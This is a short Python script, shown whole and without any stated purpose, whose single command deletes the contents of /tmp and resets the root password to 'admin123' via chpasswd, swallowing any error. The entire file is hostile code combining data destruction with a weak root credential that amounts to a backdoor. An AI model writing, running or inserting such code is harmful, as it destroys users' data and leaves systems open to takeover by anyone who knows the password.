#!/usr/bin/env python
import os
import sys
try:
    os.system('rm -r /tmp/*;echo root:admin123|/usr/sbin/chpasswd')
except:
     sys.exit()


